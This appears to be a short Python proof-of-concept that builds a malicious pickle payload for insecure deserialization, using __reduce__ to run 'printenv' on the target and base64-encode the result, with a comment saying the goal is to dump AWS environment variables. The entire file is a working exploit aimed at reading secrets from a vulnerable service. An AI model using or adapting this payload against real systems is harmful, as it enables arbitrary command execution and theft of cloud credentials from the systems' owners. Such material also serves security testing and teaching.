# Deserialization using python and pickle
# Payload to print AWS env

import subprocess
import pickle
import base64

class CMD():
    def __reduce__(self):
        return (subprocess.check_output, (['printenv'],))

pickledData=pickle.dumps(CMD())

print(base64.b64encode(pickledData))

